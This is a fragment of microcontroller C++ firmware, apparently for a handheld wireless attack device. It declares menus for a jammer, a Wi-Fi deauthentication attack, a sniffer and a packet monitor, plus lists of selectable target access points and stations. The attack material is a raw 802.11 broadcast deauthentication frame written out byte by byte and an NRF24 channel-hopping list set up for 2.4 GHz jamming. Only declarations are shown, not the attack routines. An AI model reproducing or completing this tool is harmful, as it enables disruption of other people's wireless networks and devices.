#define down 16754775
#define up 16736925
#define c 16712445
#define recv 2
IRrecv irrecv(recv);
decode_results results;


#define ce 16
#define sck 2
#define miso 12
#define mosi 13
#define csn 15
RF24 rad(ce, csn, 16000000);
bool radInit = false;
byte hopping_channel[] = { 32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80, 82, 84, 86 };


#define i2c_Address 0x3c
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SH1106G dis = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);



Menu* activem;
Menu* mainm;

Menu* scanm;
Menu* apScanm;
Menu* stScanm;

Menu* selectm;
Menu* selectAp;
Menu* selectSt;

Menu* attackm;
Menu* jammerm;
Menu* deauthm;
bool deauthing = false;
bool jamming = false;

Menu* snifferm;
Menu* packetMonitorm;
bool monitor = false;

struct AccessPoint {
  String ssid;
  uint8_t* bssid;
};
std::vector<AccessPoint> apList;
std::vector<bool> selectedApList;

struct Station {
  String ssid;
  uint8_t* bssid;
  int rssid;
};
std::vector<Station> stList;
std::vector<bool> selectedStList;


bool firstApScan = false;


#define minRow 0
#define maxRow 127
#define minLine 0
#define maxLine 63
#define Row1 0
#define Row2 20
#define Row3 40
#define Row4 70
#define Row5 95
#define Row6 115
#define LineText 0
#define Line 12
#define LineVal 47

#define maxCh 13
#define ledPin 2
#define packetRate 5
unsigned long prevTime = 0;
unsigned long curTime = 0;
unsigned long pkts = 0;
unsigned long no_deauths = 0;
unsigned long deauths = 0;
int curChannel = 1;
unsigned long maxVal = 0;
double multiplicator = 0.0;
unsigned int val[128];

uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00,                          //Frame-Typ
  /*  2 - 3  */ 0x00, 0x00,                          //Zeitspanne
  /*  4 - 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  //Ziel-Adresse
  /* 10 - 15 */ 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,  //Quell-Adresse
  /* 16 - 21 */ 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,  //Indentifizierungs-Adresse
  /* 22 - 23 */ 0x00, 0x01,                          //Sequenz-nummer
  /* 24 - 25 */ 0x01, 0x00                           //Reason-code
};